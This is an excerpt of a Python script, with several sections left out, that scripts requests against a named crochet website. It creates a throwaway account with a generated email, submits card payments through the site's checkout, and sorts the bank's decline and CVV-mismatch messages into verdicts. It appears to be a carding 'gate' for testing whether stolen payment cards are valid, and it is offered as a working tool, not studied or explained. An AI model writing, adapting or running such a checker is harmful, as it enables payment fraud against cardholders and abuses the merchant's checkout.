...
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[ First Requests: get initial page ]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    ...
    response = session.get('https://www.ilikecrochet.com/subscribe-2col/gctmbfp59/', headers=headers)
...
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[ Second Requests: Filling out the form ]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    ...
    email = makeGate.email_generator()
    ...
    response = session.post('https://www.ilikecrochet.com/wp-admin/admin-ajax.php', headers=headers, data=data)
    user_id = makeGate.getStr(response.text, '"user_id":', ',"')
...
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[ Third req: processing the payment ]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    ...
    response = session.post('https://www.ilikecrochet.com/', params=params, headers=headers, data=data)

    if "Your transaction was declined. Please use a different card or contact your bank." in response.text:
        msgx = "DECLINED ❌"
        resultado = makeGate.getStr(response.text, '"errors":["', '"]')

    elif "The transaction was declined. Please use a different card contact your bank or contact support." in response.text:
        msgx = "DECLINED ❌"
        resultado = makeGate.getStr(response.text, '"errors":["', '"]')

    elif "Your card number is not valid. Please update your card number." in response.text:
        msgx = "DECLINED ❌"
        resultado = makeGate.getStr(response.text, '"errors":["', '"]')

    elif "The security code you entered does not match. Please update the CVV and try again." in response.text:
